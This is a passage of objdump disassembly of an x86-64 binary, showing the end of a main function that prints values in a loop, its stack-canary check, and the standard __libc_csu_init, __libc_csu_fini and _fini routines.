 ce3:	0f b6 f1             	movzbl %cl,%esi
 ce6:	89 d1                	mov    %edx,%ecx
 ce8:	89 c2                	mov    %eax,%edx
 cea:	48 8d 3d 74 01 00 00 	lea    0x174(%rip),%rdi        # e65 <_IO_stdin_used+0x85>
 cf1:	b8 00 00 00 00       	mov    $0x0,%eax
 cf6:	e8 45 f9 ff ff       	callq  640 <printf@plt>
 cfb:	8b 45 f0             	mov    -0x10(%rbp),%eax
 cfe:	85 c0                	test   %eax,%eax
 d00:	7e 1d                	jle    d1f <main+0x1ac>
 d02:	8b 55 f0             	mov    -0x10(%rbp),%edx
 d05:	0f b6 45 f7          	movzbl -0x9(%rbp),%eax
 d09:	0f b6 c0             	movzbl %al,%eax
 d0c:	89 c6                	mov    %eax,%esi
 d0e:	48 8d 3d 6b 01 00 00 	lea    0x16b(%rip),%rdi        # e80 <_IO_stdin_used+0xa0>
 d15:	b8 00 00 00 00       	mov    $0x0,%eax
 d1a:	e8 21 f9 ff ff       	callq  640 <printf@plt>
 d1f:	bf 0a 00 00 00       	mov    $0xa,%edi
 d24:	e8 f7 f8 ff ff       	callq  620 <putchar@plt>
 d29:	8b 45 d8             	mov    -0x28(%rbp),%eax
 d2c:	83 e8 01             	sub    $0x1,%eax
 d2f:	89 45 d8             	mov    %eax,-0x28(%rbp)
 d32:	8b 45 d8             	mov    -0x28(%rbp),%eax
 d35:	85 c0                	test   %eax,%eax
 d37:	0f 89 1a ff ff ff    	jns    c57 <main+0xe4>
 d3d:	b8 00 00 00 00       	mov    $0x0,%eax
 d42:	48 8b 4d f8          	mov    -0x8(%rbp),%rcx
 d46:	64 48 33 0c 25 28 00 	xor    %fs:0x28,%rcx
 d4d:	00 00 
 d4f:	74 05                	je     d56 <main+0x1e3>
 d51:	e8 da f8 ff ff       	callq  630 <__stack_chk_fail@plt>
 d56:	c9                   	leaveq 
 d57:	c3                   	retq   
 d58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 d5f:	00 

0000000000000d60 <__libc_csu_init>:
 d60:	41 57                	push   %r15
 d62:	41 56                	push   %r14
 d64:	49 89 d7             	mov    %rdx,%r15
 d67:	41 55                	push   %r13
 d69:	41 54                	push   %r12
 d6b:	4c 8d 25 2e 10 20 00 	lea    0x20102e(%rip),%r12        # 201da0 <__frame_dummy_init_array_entry>
 d72:	55                   	push   %rbp
 d73:	48 8d 2d 2e 10 20 00 	lea    0x20102e(%rip),%rbp        # 201da8 <__init_array_end>
 d7a:	53                   	push   %rbx
 d7b:	41 89 fd             	mov    %edi,%r13d
 d7e:	49 89 f6             	mov    %rsi,%r14
 d81:	4c 29 e5             	sub    %r12,%rbp
 d84:	48 83 ec 08          	sub    $0x8,%rsp
 d88:	48 c1 fd 03          	sar    $0x3,%rbp
 d8c:	e8 67 f8 ff ff       	callq  5f8 <_init>
 d91:	48 85 ed             	test   %rbp,%rbp
 d94:	74 20                	je     db6 <__libc_csu_init+0x56>
 d96:	31 db                	xor    %ebx,%ebx
 d98:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 d9f:	00 
 da0:	4c 89 fa             	mov    %r15,%rdx
 da3:	4c 89 f6             	mov    %r14,%rsi
 da6:	44 89 ef             	mov    %r13d,%edi
 da9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 dad:	48 83 c3 01          	add    $0x1,%rbx
 db1:	48 39 dd             	cmp    %rbx,%rbp
 db4:	75 ea                	jne    da0 <__libc_csu_init+0x40>
 db6:	48 83 c4 08          	add    $0x8,%rsp
 dba:	5b                   	pop    %rbx
 dbb:	5d                   	pop    %rbp
 dbc:	41 5c                	pop    %r12
 dbe:	41 5d                	pop    %r13
 dc0:	41 5e                	pop    %r14
 dc2:	41 5f                	pop    %r15
 dc4:	c3                   	retq   
 dc5:	90                   	nop
 dc6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 dcd:	00 00 00 

0000000000000dd0 <__libc_csu_fini>:
 dd0:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000dd4 <_fini>:
 dd4:	48 83 ec 08          	sub    $0x8,%rsp
 dd8:	48 83 c4 08          	add    $0x8,%rsp
 ddc:	c3                   	retq   
